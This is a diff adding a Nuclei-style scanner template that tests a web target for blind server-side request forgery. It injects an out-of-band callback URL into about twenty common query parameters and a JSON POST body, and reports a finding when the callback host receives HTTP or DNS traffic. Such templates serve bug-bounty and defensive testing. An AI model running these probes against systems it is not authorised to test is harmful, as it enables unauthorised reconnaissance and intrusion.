@@ -1,0 +1,66 @@
+id: ssrf-common-params
+
+info:
+  name: SSRF via Common Parameters
+  author: bb-toolkit
+  severity: high
+  description: Detects Server-Side Request Forgery via common URL parameters. Replace BURP_COLLABORATOR with your out-of-band server (interactsh, burp collaborator, etc.)
+  reference:
+    - https://portswigger.net/web-security/ssrf
+  tags: ssrf,oob,blind
+
+# IMPORTANT: Replace {{interactsh-url}} with your own OOB server
+# Get one free: interactsh-client (go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url={{interactsh-url}}"
+      - "{{BaseURL}}?uri={{interactsh-url}}"
+      - "{{BaseURL}}?link={{interactsh-url}}"
+      - "{{BaseURL}}?src={{interactsh-url}}"
+      - "{{BaseURL}}?source={{interactsh-url}}"
+      - "{{BaseURL}}?dest={{interactsh-url}}"
+      - "{{BaseURL}}?destination={{interactsh-url}}"
+      - "{{BaseURL}}?redirect={{interactsh-url}}"
+      - "{{BaseURL}}?callback={{interactsh-url}}"
+      - "{{BaseURL}}?fetch={{interactsh-url}}"
+      - "{{BaseURL}}?proxy={{interactsh-url}}"
+      - "{{BaseURL}}?load={{interactsh-url}}"
+      - "{{BaseURL}}?path={{interactsh-url}}"
+      - "{{BaseURL}}?file={{interactsh-url}}"
+      - "{{BaseURL}}?import={{interactsh-url}}"
+      - "{{BaseURL}}?document={{interactsh-url}}"
+      - "{{BaseURL}}?host={{interactsh-url}}"
+      - "{{BaseURL}}?domain={{interactsh-url}}"
+      - "{{BaseURL}}?remote={{interactsh-url}}"
+      - "{{BaseURL}}?return={{interactsh-url}}"
+      - "{{BaseURL}}?next={{interactsh-url}}"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
+
+  # SSRF via POST body (JSON)
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/api/v1"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"url":"{{interactsh-url}}","uri":"{{interactsh-url}}","link":"{{interactsh-url}}"}'
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
